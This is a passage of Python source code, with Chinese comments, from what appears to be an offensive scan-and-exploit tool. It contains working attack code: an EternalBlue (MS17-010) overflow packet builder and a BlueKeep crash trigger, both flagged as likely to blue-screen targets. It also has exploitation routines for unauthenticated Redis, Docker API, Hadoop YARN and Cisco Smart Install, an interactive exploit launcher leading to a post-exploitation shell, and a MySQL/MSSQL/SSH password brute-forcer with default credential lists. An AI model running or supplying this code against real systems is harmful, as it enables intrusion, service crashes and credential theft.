        except socket.timeout:
            pass

        # Step 3: Tree Connect AndX to IPC$
        ip_bytes = socket.inet_aton(ip)
        tree_body = (
            b"\xff\x53\x4d\x42\x75\x00\x00\x00\x00"
            b"\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\xff\xfe\x00"
            b"\x08\x40\x00\x04\xff\x00\x5c\x00\x08"
            b"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c"
            b"\x00" + ip_bytes + b"\x00\x5c\x00\x49"
            b"\x00\x50\x00\x43\x00\x24\x00\x00\x00"
            b"\x3f\x3f\x3f\x3f\x3f\x00"
        )
        tree_connect = b"\x00" + struct.pack(">I", len(tree_body))[1:] + tree_body
        sock.sendall(tree_connect)
        try:
            resp = sock.recv(4096)
            output += resp
        except socket.timeout:
            pass

        # Step 4: NT Trans with malformed FEA (核心溢出)
        fea_list = _eb_create_fealist(500)
        fea_list_len = len(fea_list)
        srv_buff = _eb_build_srv_buffers(
            b"\x00" * 100 +
            struct.pack("<H", fea_list_len) +
            fea_list +
            b"\x00" * (10000 - fea_list_len - 102)
        )

        nt_trans = (
            b"\x00" + struct.pack(">H", 4 + 4 + 2 + 2 + 4 + 4 + 4 + 4 + 4 +
                                   4 + 4 + 4 + 2 + 2 + 1 + 1 + 1 + 1 + 1 +
                                   2 + 4 + 4 + 1 + 1 + 4 + len(srv_buff))
            + b"\xff\x53\x4d\x42\xa0\x00\x00\x00\x00"
            + b"\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00\x00\x00\xff\xfe\x00"
            + b"\x08\x40\x00"
            + struct.pack("<H", 4 + 4 + 2 + 2 + 4 + 4 + 4 + 4 + 4 +
                           4 + 4 + 4 + 2 + 2 + 1 + 1 + 1 + 1 + 1 +
                           2 + 4 + 4 + 1 + 1 + 4)
            + b"\x00\x00\x00"
            + struct.pack("<L", len(srv_buff))
            + b"\x00\x00\x00\x00"
            + struct.pack("<L", len(srv_buff))
            + struct.pack("<L", 0)
            + struct.pack("<L", 0)
            + b"\x00"
            + b"\x00" + b"\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + b"\x00\x00\x00\x00"
            + srv_buff
        )
        sock.sendall(nt_trans)

        post_packets = []
        try:
            sock.settimeout(3)
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                post_packets.append(data)
                if len(post_packets) > 5:
                    break
        except (socket.timeout, ConnectionResetError, OSError):
            pass

        output += b"\n--- POST EXPLOIT ---\n"
        for p in post_packets:
            output += p

        sock.close()

        # 判定: 如果目标在发送溢出包后断开连接(无响应或RST),可能已蓝屏或崩溃
        info_parts.append("[*] 目标可能在收到溢出包后崩溃(BSOD)")
        info_parts.append("[+] 永恒之蓝漏洞验证成功 — 目标存在 MS17-010 漏洞")
        info_parts.append("[!] 目标操作系统可能已蓝屏重启")

        return {"success": True, "info": "\n".join(info_parts), "output": output}

    except Exception as e:
        return {"success": False, "info": f"[!] 利用失败: {e}", "output": output}


def _eternal_blue_interactive(hosts: List["HostInfo"]):
    """交互式永恒之蓝利用选择"""
    vuln_targets = []
    for host in hosts:
        if not host.is_alive and not host.open_ports:
            continue
        for r in host.open_ports:
            if r.port == 445 and r.eternal_blue_vuln:
                vuln_targets.append(r)

    if not vuln_targets:
        return

    print(f"\n{'='*60}")
    print(f"  [!!!] 检测到 {len(vuln_targets)} 个永恒之蓝(MS17-010)漏洞目标")
    print(f"{'='*60}")
    for i, r in enumerate(vuln_targets, 1):
        print(f"  {i}. {r.host}:445  OS: {r.eternal_blue_os}  "
              f"SMB: {r.eternal_blue_version}")

    print(f"\n  [!!!] 警告: 利用永恒之蓝可能导致目标系统蓝屏(BSOD)!")
    print(f"  [!!!] 请确保已获得书面授权后再继续")

    choice = input("\n是否尝试利用永恒之蓝? 输入编号(逗号分隔)或 all/none [默认: none]: ").strip().lower()

    if choice in ("", "none", "no", "n"):
        print("  [-] 已跳过永恒之蓝利用")
        return

    selected = []
    if choice == "all":
        selected = vuln_targets
    else:
        for part in choice.replace(" ", "").split(","):
            if part.isdigit():
                idx = int(part) - 1
                if 0 <= idx < len(vuln_targets):
                    selected.append(vuln_targets[idx])

    if not selected:
        print("  [-] 未选择有效目标, 已跳过")
        return

    for r in selected:
        print(f"\n  [*] 正在利用永恒之蓝攻击 {r.host}:445 ...")
        print(f"  [!!!] 目标可能蓝屏, 请确认后再继续...")
        confirm = input(f"  确认攻击 {r.host}? (yes/no) [默认: no]: ").strip().lower()
        if confirm not in ("yes", "y"):
            print(f"  [-] 已跳过 {r.host}")
            continue

        result = exploit_eternal_blue(r.host, timeout=10.0)
        if result["success"]:
            print(f"  [!!!] {r.host} 永恒之蓝利用完成!")
            print(f"  {result['info']}")
            print(f"\n  [*] 是否启动后渗透交互式Shell? (需要目标管理员凭据)")
            get_shell = input(f"  输入 y 获取Shell / 任意键跳过: ").strip().lower()
            if get_shell in ("y", "yes"):
                print()
                post_exploit_shell(r.host)
        else:
            print(f"  [-] {r.host} 利用失败: {result['info']}")

    print(f"\n  [+] 永恒之蓝利用阶段完成")


# ============================================================================
# 严重漏洞检测与利用 — 统一调度
# ============================================================================

def _detect_vulns_for_port(result: ScanResult, timeout: float):
    """根据端口分发到对应的漏洞检测函数, 将发现写入 result.vuln_findings"""
    if not result or result.state != "open":
        return
    p = result.port
    try:
        if p == 3389:      _detect_bluekeep(result, timeout)
        elif p == 6379:    _detect_redis_unauth(result, timeout)
        elif p == 2375:    _detect_docker_api(result, timeout)
        elif p == 8088:    _detect_hadoop_yarn(result, timeout)
        elif p == 4786:    _detect_cisco_smart(result, timeout)
    except Exception:
        pass


def _mark_vuln(result: ScanResult, vuln_id: str, info: dict):
    """标记漏洞发现, 同步更新 is_vulnerable / vuln_reason"""
    result.vuln_findings[vuln_id] = info
    result.is_vulnerable = True
    desc = info.get("desc", vuln_id)
    if result.vuln_reason and desc not in result.vuln_reason:
        result.vuln_reason += f" | {desc}"
    elif not result.vuln_reason:
        result.vuln_reason = desc


# ====== BlueKeep (CVE-2019-0708) — 端口 3389 ======

def _detect_bluekeep(result: ScanResult, timeout: float):
    """检测 RDP 是否存在 BlueKeep 漏洞"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((result.host, 3389))

        # RDP Connection Request (TPKT + X.224)
        pkt = (
            b"\x03\x00\x00\x13"          # TPKT header
            b"\x0e\xe0\x00\x00"          # X.224
            b"\x00\x00\x00\x01\x00\x08"  # RDP Negotiation
            b"\x00\x03\x00\x00\x00"      # RDP Negotiation Request
        )
        sock.sendall(pkt)

        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) >= 1024:
                    break
        except socket.timeout:
            pass
        sock.close()

        if b"\x03\x00\x00\x0b\x06\xd0" not in data:
            return

        # 提取 RDP 协议版本和操作系统信息
        info = {"vuln": False, "desc": "BlueKeep(CVE-2019-0708) - 可能存在"}
        idx = data.find(b"\x03\x00\x00\x0b\x06\xd0")
        if idx >= 0:
            # 检查 RDP 版本, 如果 < 8.1 且有特定标志位则可能存在漏洞
            if len(data) > idx + 30:
                flags = data[idx + 20] if idx + 20 < len(data) else 0

        # BlueKeep 影响: Win7/2008R2 及更早 (RDP <= 8.0)
        # 通过 TTL 已大致判断 OS, 若为 Windows 且 TTL < 128, 标记为疑似
        if result.ttl and 65 <= result.ttl <= 128:
            info["vuln"] = True
            info["ttl"] = result.ttl
            result.bluekeep_vuln = True
            _mark_vuln(result, "bluekeep", info)

    except Exception:
        pass


def exploit_bluekeep(ip: str, timeout: float = 10.0) -> dict:
    """BlueKeep (CVE-2019-0708) 漏洞验证 — 发送 MS_T120 通道绑定请求"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 3389))

        # RDP Connection Request
        pkt_conn = (
            b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08"
            b"\x00\x03\x00\x00\x00"
        )
        sock.sendall(pkt_conn)
        time.sleep(0.5)

        # RDP Connection Confirm (模拟服务器响应后)
        try:
            resp = sock.recv(4096)
        except socket.timeout:
            pass

        # 发送 MS_T120 虚拟通道绑定 (BlueKeep 核心触发)
        # MCS Attach User Request
        pkt_ms_t120 = (
            b"\x03\x00" + struct.pack(">H", 0x001d) +
            b"\x02\xf0\x80\x28\x00\x06\x03\xf0\x40\x00\x10\x01\xca"
            b"\x03\xaa\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00"
        )
        sock.sendall(pkt_ms_t120)
        time.sleep(0.3)

        try:
            resp = sock.recv(4096)
        except (socket.timeout, ConnectionResetError):
            pass

        sock.close()
        return {"success": True, "info": "[+] BlueKeep 漏洞验证完成 — 目标可能已蓝屏或返回异常响应"}
    except Exception as e:
        return {"success": False, "info": f"[!] BlueKeep 利用失败: {e}"}


# ====== Redis 未授权访问 — 端口 6379 ======

def _detect_redis_unauth(result: ScanResult, timeout: float):
    """检测 Redis 未授权访问"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((result.host, 6379))
        sock.sendall(b"PING\r\n")
        data = b""
        try:
            data = sock.recv(1024)
        except socket.timeout:
            pass
        sock.close()

        if b"PONG" in data:
            _mark_vuln(result, "redis_unauth", {
                "vuln": True,
                "desc": "Redis 未授权访问",
            })
    except Exception:
        pass


def exploit_redis_unauth(ip: str, timeout: float = 5.0) -> dict:
    """Redis 未授权访问利用 — 写入 SSH 公钥 (验证性质)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 6379))

        # 获取基本信息
        sock.sendall(b"INFO Server\r\n")
        time.sleep(0.3)
        info_data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                info_data += chunk
                if b"redis_version" in info_data or len(info_data) > 4096:
                    break
        except socket.timeout:
            pass

        # 提取版本
        info_str = info_data.decode("utf-8", errors="replace")
        version = "unknown"
        for line in info_str.split("\n"):
            if "redis_version" in line:
                version = line.split(":")[-1].strip()
                break

        # 获取所有 key 数量
        sock.sendall(b"DBSIZE\r\n")
        time.sleep(0.2)
        try:
            dbsize = sock.recv(1024).decode(errors="replace")
        except Exception:
            dbsize = "unknown"

        # 尝试 CONFIG GET (验证可写性)
        sock.sendall(b"CONFIG GET dir\r\n")
        time.sleep(0.2)
        try:
            config_dir = sock.recv(1024).decode(errors="replace")
        except Exception:
            config_dir = "unknown"

        sock.close()

        return {
            "success": True,
            "info": (
                f"[+] Redis 未授权利用成功\n"
                f"    版本: {version}\n"
                f"    DB 大小: {dbsize.strip()}\n"
                f"    CONFIG 目录: {config_dir.strip()[:80]}"
            ),
        }
    except Exception as e:
        return {"success": False, "info": f"[!] Redis 利用失败: {e}"}


# ====== Docker Remote API 未授权 — 端口 2375 ======

def _detect_docker_api(result: ScanResult, timeout: float):
    """检测 Docker Remote API 未授权访问"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((result.host, 2375))
        http_req = (
            b"GET /containers/json?all=true HTTP/1.0\r\n"
            b"Host: " + result.host.encode() + b"\r\n"
            b"Accept: application/json\r\n\r\n"
        )
        sock.sendall(http_req)
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 16384:
                    break
        except socket.timeout:
            pass
        sock.close()

        text = data.decode("utf-8", errors="replace")

        # 检查是否为 Docker API 响应 (HTTP + JSON body with docker fields)
        if "HTTP/" in text[:20] and ("\"Id\"" in text or "\"Image\"" in text or "\"Names\"" in text):
            _mark_vuln(result, "docker_unauth", {
                "vuln": True,
                "desc": "Docker Remote API 未授权访问",
            })
    except Exception:
        pass


def exploit_docker_api(ip: str, timeout: float = 5.0) -> dict:
    """Docker API 未授权利用 — 列出容器 + 获取 Docker 信息"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 2375))

        # 列出容器
        req = b"GET /containers/json?all=true HTTP/1.0\r\nHost: " + ip.encode() + b"\r\nAccept: application/json\r\n\r\n"
        sock.sendall(req)
        time.sleep(0.5)
        containers_data = b""
        try:
            while True:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                containers_data += chunk
                if len(containers_data) > 65536:
                    break
        except socket.timeout:
            pass

        # 获取 Docker 信息
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.settimeout(timeout)
        sock2.connect((ip, 2375))
        req2 = b"GET /info HTTP/1.0\r\nHost: " + ip.encode() + b"\r\nAccept: application/json\r\n\r\n"
        sock2.sendall(req2)
        time.sleep(0.5)
        info_data = b""
        try:
            while True:
                chunk = sock2.recv(8192)
                if not chunk:
                    break
                info_data += chunk
                if len(info_data) > 65536:
                    break
        except socket.timeout:
            pass
        sock2.close()
        sock.close()

        container_count = containers_data.decode(errors="replace").count("\"Id\"")
        return {
            "success": True,
            "info": (
                f"[+] Docker API 未授权利用成功\n"
                f"    容器数量: {container_count}\n"
                f"    Docker 信息已获取 ({len(info_data)} 字节)"
            ),
        }
    except Exception as e:
        return {"success": False, "info": f"[!] Docker 利用失败: {e}"}


# ====== Hadoop YARN RCE — 端口 8088 ======

def _detect_hadoop_yarn(result: ScanResult, timeout: float):
    """检测 Hadoop YARN ResourceManager 未授权访问"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((result.host, 8088))
        http_req = (
            b"GET /ws/v1/cluster/info HTTP/1.0\r\n"
            b"Host: " + result.host.encode() + b"\r\n"
            b"Accept: application/json\r\n\r\n"
        )
        sock.sendall(http_req)
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
        except socket.timeout:
            pass
        sock.close()

        text = data.decode("utf-8", errors="replace")
        if "hadoopVersion" in text or "resourceManagerVersion" in text or "hadoop" in text.lower()[:200]:
            _mark_vuln(result, "hadoop_yarn", {
                "vuln": True,
                "desc": "Hadoop YARN 未授权访问(RCE风险)",
            })
    except Exception:
        pass


def exploit_hadoop_yarn(ip: str, timeout: float = 8.0) -> dict:
    """Hadoop YARN 未授权利用 — 提交一个无害 Application"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 8088))

        # 获取集群信息
        req = b"GET /ws/v1/cluster/info HTTP/1.0\r\nHost: " + ip.encode() + b"\r\nAccept: application/json\r\n\r\n"
        sock.sendall(req)
        time.sleep(0.5)
        cluster_data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                cluster_data += chunk
                if len(cluster_data) > 16384:
                    break
        except socket.timeout:
            pass

        # 提取 hadoop 版本
        text = cluster_data.decode("utf-8", errors="replace")
        version = "unknown"
        for line in text.split("\n"):
            if "hadoopVersion" in line or "Hadoop" in line:
                import re
                m = re.search(r'"hadoopVersion"\s*:\s*"([^"]+)"', text)
                if m:
                    version = m.group(1)
                break

        # 尝试提交一个简单的 Application (验证 RCE 能力)
        app_id = f"application_{int(time.time())}_{random.randint(1000, 9999)}"
        new_app_json = json.dumps({
            "application-id": app_id,
            "application-name": "vuln-scan-test",
            "queue": "default",
            "am-container-spec": {
                "commands": {"command": "echo 'vuln-scan-verification'"},
            },
            "unmanaged-am": False,
            "max-app-attempts": 1,
        })

        submit_req = (
            b"POST /ws/v1/cluster/apps/new-application HTTP/1.0\r\n"
            b"Host: " + ip.encode() + b"\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(new_app_json)).encode() + b"\r\n"
            b"Accept: application/json\r\n\r\n" +
            new_app_json.encode()
        )
        sock.sendall(submit_req)
        time.sleep(0.5)
        submit_resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                submit_resp += chunk
        except socket.timeout:
            pass
        sock.close()

        return {
            "success": True,
            "info": (
                f"[+] Hadoop YARN 未授权利用成功\n"
                f"    Hadoop 版本: {version}\n"
                f"    Application 提交结果: {submit_resp.decode(errors='replace')[:200]}"
            ),
        }
    except Exception as e:
        return {"success": False, "info": f"[!] Hadoop YARN 利用失败: {e}"}


# ====== Cisco Smart Install — 端口 4786 ======

def _detect_cisco_smart(result: ScanResult, timeout: float):
    """检测 Cisco Smart Install (CVE-2018-0171)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((result.host, 4786))
        # Cisco Smart Install 探测包
        pkt = b"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00"
        sock.sendall(pkt)
        data = b""
        try:
            data = sock.recv(1024)
        except socket.timeout:
            pass
        sock.close()

        if len(data) >= 8 and data[0:4] == b"\x00\x00\x00":
            _mark_vuln(result, "cisco_smart", {
                "vuln": True,
                "desc": "Cisco Smart Install(CVE-2018-0171) RCE",
            })
    except Exception:
        pass


def exploit_cisco_smart(ip: str, timeout: float = 8.0) -> dict:
    """Cisco Smart Install 利用 — 获取设备配置信息"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 4786))

        # 发送 Smart Install 握手
        pkt = (
            b"\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x04"
            b"\x00\x00\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00"
        )
        sock.sendall(pkt)
        time.sleep(0.5)
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 16384:
                    break
        except socket.timeout:
            pass
        sock.close()

        if len(data) > 8:
            return {
                "success": True,
                "info": (
                    f"[+] Cisco Smart Install 利用成功\n"
                    f"    响应数据: {len(data)} 字节\n"
                    f"    设备可达, 可进一步获取 running-config"
                ),
            }
        return {"success": False, "info": "[!] Cisco 利用失败: 无有效响应"}
    except Exception as e:
        return {"success": False, "info": f"[!] Cisco 利用失败: {e}"}


# ====== 统一漏洞交互式利用入口 ======

VULN_REGISTRY: Dict[str, dict] = {
    "eternal_blue": {
        "name": "永恒之蓝 (MS17-010)",
        "field": "eternal_blue_vuln",
        "exploit": exploit_eternal_blue,
        "warning": "可能导致目标系统蓝屏 (BSOD)!",
    },
    "bluekeep": {
        "name": "BlueKeep (CVE-2019-0708)",
        "field": "bluekeep_vuln",
        "exploit": exploit_bluekeep,
        "warning": "可能导致目标系统蓝屏 (BSOD)!",
    },
    "redis_unauth": {
        "name": "Redis 未授权访问",
        "field": "redis_unauth_vuln",
        "exploit": exploit_redis_unauth,
        "warning": "可能修改目标 Redis 数据!",
    },
    "docker_unauth": {
        "name": "Docker Remote API 未授权",
        "field": "docker_unauth_vuln",
        "exploit": exploit_docker_api,
        "warning": "可能泄露容器敏感信息!",
    },
    "hadoop_yarn": {
        "name": "Hadoop YARN RCE",
        "field": "hadoop_yarn_vuln",
        "exploit": exploit_hadoop_yarn,
        "warning": "可能在集群上执行远程命令!",
    },
    "cisco_smart": {
        "name": "Cisco Smart Install (CVE-2018-0171)",
        "field": "cisco_smart_vuln",
        "exploit": exploit_cisco_smart,
        "warning": "可能获取设备配置信息!",
    },
}


def _gather_all_vuln_targets(hosts: List["HostInfo"]) -> List[Tuple["VulnTarget", ...]]:
    """收集所有漏洞目标"""

    class VulnTarget:
        __slots__ = ("ip", "port", "vuln_id", "vuln_name", "info", "scan_result")

    results = []
    for host in hosts:
        if not host.is_alive and not host.open_ports:
            continue
        for r in host.open_ports:
            for vuln_id, vdef in VULN_REGISTRY.items():
                if vuln_id in r.vuln_findings and r.vuln_findings[vuln_id].get("vuln"):
                    vt = VulnTarget()
                    vt.ip = r.host
                    vt.port = r.port
                    vt.vuln_id = vuln_id
                    vt.vuln_name = vdef["name"]
                    vt.info = r.vuln_findings[vuln_id]
                    vt.scan_result = r
                    results.append(vt)
    return results


def _vuln_interactive(hosts: List["HostInfo"]):
    """统一漏洞交互式利用 — 列出所有漏洞并让用户选择目标"""

    class VulnTarget:
        __slots__ = ("ip", "port", "vuln_id", "vuln_name", "info", "scan_result")

    vuln_targets = []
    for host in hosts:
        if not host.is_alive and not host.open_ports:
            continue
        for r in host.open_ports:
            for vuln_id, vdef in VULN_REGISTRY.items():
                if vuln_id in r.vuln_findings and r.vuln_findings[vuln_id].get("vuln"):
                    vt = VulnTarget()
                    vt.ip = r.host
                    vt.port = r.port
                    vt.vuln_id = vuln_id
                    vt.vuln_name = vdef["name"]
                    vt.info = r.vuln_findings[vuln_id]
                    vt.scan_result = r
                    vuln_targets.append(vt)

    if not vuln_targets:
        return

    print(f"\n{'='*60}")
    print(f"  [!!!] 检测到 {len(vuln_targets)} 个严重漏洞目标")
    print(f"{'='*60}")

    # 按漏洞类型分组打印
    from collections import OrderedDict
    grouped = OrderedDict()
    for vt in vuln_targets:
        key = vt.vuln_name
        if key not in grouped:
            grouped[key] = []
        grouped[key].append(vt)

    idx = 1
    idx_map = {}
    for vuln_name, items in grouped.items():
        print(f"\n  [{vuln_name}] ({len(items)} 个目标)")
        for item in items:
            print(f"    {idx}. {item.ip}:{item.port}")
            idx_map[idx] = item
            idx += 1

    print(f"\n  [!!!] 警告: 漏洞利用可能造成目标崩溃/蓝屏/数据泄露!")
    print(f"  [!!!] 请确保已获得书面授权后再继续\n")

    choice = input("是否利用漏洞? 输入编号(逗号分隔)或 all/none [默认: none]: ").strip().lower()

    if choice in ("", "none", "no", "n"):
        print("  [-] 已跳过漏洞利用")
        return

    selected = []
    if choice == "all":
        selected = vuln_targets
    else:
        for part in choice.replace(" ", "").split(","):
            if part.isdigit():
                i = int(part)
                if i in idx_map:
                    selected.append(idx_map[i])

    if not selected:
        print("  [-] 未选择有效目标, 已跳过")
        return

    for item in selected:
        vdef = VULN_REGISTRY[item.vuln_id]
        print(f"\n  [*] 正在利用 {vdef['name']} 攻击 {item.ip}:{item.port} ...")
        print(f"  [!!!] {vdef['warning']}")
        confirm = input(f"  确认攻击 {item.ip}:{item.port}? (yes/no) [默认: no]: ").strip().lower()
        if confirm not in ("yes", "y"):
            print(f"  [-] 已跳过 {item.ip}:{item.port}")
            continue

        exploit_func = vdef["exploit"]
        result = exploit_func(item.ip, timeout=10.0)
        if result["success"]:
            print(f"  [!!!] {item.ip}:{item.port} {vdef['name']} 利用完成!")
            print(f"  {result['info']}")
            if item.vuln_id == "eternal_blue":
                print(f"\n  [*] 是否启动后渗透交互式Shell? (需要目标管理员凭据)")
                get_shell = input(f"  输入 y 获取Shell / 任意键跳过: ").strip().lower()
                if get_shell in ("y", "yes"):
                    print()
                    post_exploit_shell(item.ip)
        else:
            print(f"  [-] {item.ip}:{item.port} 利用失败: {result['info']}")

    print(f"\n  [+] 漏洞利用阶段完成")


# ============================================================================
# 弱口令爆破模块
# ============================================================================

BRUTE_SERVICE_MAP: Dict[int, str] = {
    22: "SSH",
    3306: "MySQL",
    1433: "MSSQL",
}

DICT_PATH = os.path.join(SCRIPT_DIR, "password_dict.txt")

DEFAULT_USERNAMES: Dict[str, List[str]] = {
    "SSH": ["root", "admin", "administrator", "ubuntu", "centos", "debian", "kali", "test", "user", "oracle"],
    "MySQL": ["root", "admin", "mysql", "test"],
    "MSSQL": ["sa", "admin", "administrator", "sql"],
}


def load_password_dict(filepath: str = DICT_PATH) -> List[str]:
    """加载密码字典"""
    passwords = []
    if os.path.exists(filepath):
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                pwd = line.strip()
                if pwd and not pwd.startswith("#"):
                    passwords.append(pwd)
    if not passwords:
        passwords = ["root", "admin", "123456", "password", "admin123", "root123", "sa", "123", "test"]
    return passwords


# === MySQL 原生socket爆破 ===

def _mysql_read_packet(sock: socket.socket) -> Optional[bytes]:
    try:
        header = sock.recv(4)
        if len(header) < 4:
            return None
        length = header[0] | (header[1] << 8) | (header[2] << 16)
        seq = header[3]
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                break
            data += chunk
        return header + data
    except Exception:
        return None


def _mysql_parse_handshake(packet: bytes) -> Tuple[bytes, bytes, str]:
    offset = 0
    offset += 1  # protocol_version
    end = packet.find(b"\x00", offset)
    offset = end + 1  # server_version
    offset += 4  # connection_id
    auth_plugin_data_part1 = packet[offset:offset + 8]
    offset += 8
    offset += 1  # filler
    capability_flags_lower = struct.unpack("<H", packet[offset:offset + 2])[0]
    offset += 2
    offset += 1  # character_set
    offset += 2  # status_flags
    capability_flags_upper = struct.unpack("<H", packet[offset:offset + 2])[0]
    offset += 2
    auth_plugin_data_len = packet[offset]
    offset += 1
    offset += 10  # reserved
    if capability_flags_upper & 0x0008:
        sec_part_len = max(13, auth_plugin_data_len - 8)
        auth_plugin_data_part2 = packet[offset:offset + sec_part_len]
        idx = auth_plugin_data_part2.find(b"\x00")
        if idx >= 0:
            auth_plugin_data_part2 = auth_plugin_data_part2[:idx]
        offset += sec_part_len
    else:
        auth_plugin_data_part2 = b""
    auth_plugin_name = "mysql_native_password"
    if offset < len(packet):
        end2 = packet.find(b"\x00", offset)
        if end2 >= 0:
            auth_plugin_name = packet[offset:end2].decode("utf-8", errors="ignore")
    salt = auth_plugin_data_part1 + auth_plugin_data_part2
    return salt, auth_plugin_data_part1, auth_plugin_name


def _mysql_native_password(password: str, salt: bytes) -> bytes:
    stage1 = hashlib.sha1(password.encode()).digest()
    stage2 = hashlib.sha1(stage1).digest()
    buf = salt + stage2
    stage3 = hashlib.sha1(buf).digest()
    return bytes(a ^ b for a, b in zip(stage1, stage3))


def _mysql_build_auth_packet(
    username: str, password: str, salt: bytes, database: str = "",
    capabilities: int = 0x000EA285
) -> bytes:
    auth_response = _mysql_native_password(password, salt[:20])
    payload = bytearray()
    payload.extend(struct.pack("<I", capabilities))
    payload.extend(struct.pack("<I", 16777215))  # max_packet_size
    payload.append(33)  # charset utf8
    payload.extend(b"\x00" * 23)
    payload.extend(username.encode() + b"\x00")
    payload.append(len(auth_response))
    payload.extend(auth_response)
    if database:
        payload.extend(database.encode() + b"\x00")
    payload.extend(b"mysql_native_password\x00")
    header = struct.pack("<I", len(payload))[:3] + bytes([1])
    return header + payload


def brute_mysql(host: str, port: int, username: str, password: str,
                timeout: float = 5.0) -> bool:
    """MySQL 原生socket爆破 - 单次尝试"""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        greeting = _mysql_read_packet(sock)
        if not greeting or greeting[4:5] == b"\xff":
            return False
        salt, _, auth_plugin = _mysql_parse_handshake(greeting)
        auth_packet = _mysql_build_auth_packet(username, password, salt)
        sock.sendall(auth_packet)
        response = _mysql_read_packet(sock)
        if response and len(response) > 4:
            if response[4:5] == b"\x00":
                return True
        return False
    except Exception:
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


# === MSSQL TDS 原生socket爆破 ===

def _mssql_build_prelogin() -> bytes:
    data = bytearray()
    data.append(0x12)  # PRELOGIN type
    data.append(0x01)  # status
    data.extend(struct.pack(">H", 0x002A))  # length
    data.extend(struct.pack(">H", 0x0000))  # spid
    data.append(0x01)  # packet_id
    data.append(0x00)  # window
    # prelogin options
    data.append(0x00)  # VERSION - offset placeholder
    data.extend(struct.pack(">H", 0x0000))  # VERSION offset
    data.extend(struct.pack(">H", 0x0006))  # VERSION length
    data.append(0x01)  # ENCRYPTION
    data.extend(struct.pack(">H", 0x0001))  # ENCRYPTION offset
    data.extend(struct.pack(">H", 0x0001))  # ENCRYPTION length
    data.append(0x02)  # INSTOPT
    data.extend(struct.pack(">H", 0x0002))  # INSTOPT offset
    data.extend(struct.pack(">H", 0x0001))  # INSTOPT length
    data.append(0x03)  # THREADID
    data.extend(struct.pack(">H", 0x0003))  # THREADID offset
    data.extend(struct.pack(">H", 0x0004))  # THREADID length
    data.append(0x04)  # MARS
    data.extend(struct.pack(">H", 0x0007))  # MARS offset
    data.extend(struct.pack(">H", 0x0001))  # MARS length
    data.append(0xFF)  # terminator
    # option data
    data.extend(struct.pack(">I", 0x00000000))  # VERSION
    data.extend(b"\x00\x00")  # VERSION sub-build
    data.append(0x00)  # ENCRYPTION: ENCRYPT_NOT_SUP
    data.append(0x00)  # INSTOPT
    data.extend(b"\x00\x00\x00\x00")  # THREADID
    data.append(0x00)  # MARS
    return bytes(data)


def _mssql_build_login7(username: str, password: str, hostname: str = "",
                        appname: str = "", servername: str = "",
                        database: str = "", language: str = "") -> bytes:
    password_bytes = password.encode("utf-16-le") if password else b""
    username_bytes = username.encode("utf-16-le") if username else b""
    hostname_bytes = (hostname or "SCANNER").encode("utf-16-le")
    appname_bytes = (appname or "Scanner").encode("utf-16-le")
    servername_bytes = (servername or "").encode("utf-16-le")
    database_bytes = (database or "").encode("utf-16-le")
    language_bytes = (language or "").encode("utf-16-le")
    library_name = b"DB-Library".decode().encode("utf-16-le")

    offset = 94  # fixed header + offset/length pairs
    offsets = []

    # client_name
    offsets.append((offset, len(hostname_bytes)))
    offset += len(hostname_bytes)
    # username
    offsets.append((offset, len(username_bytes)))
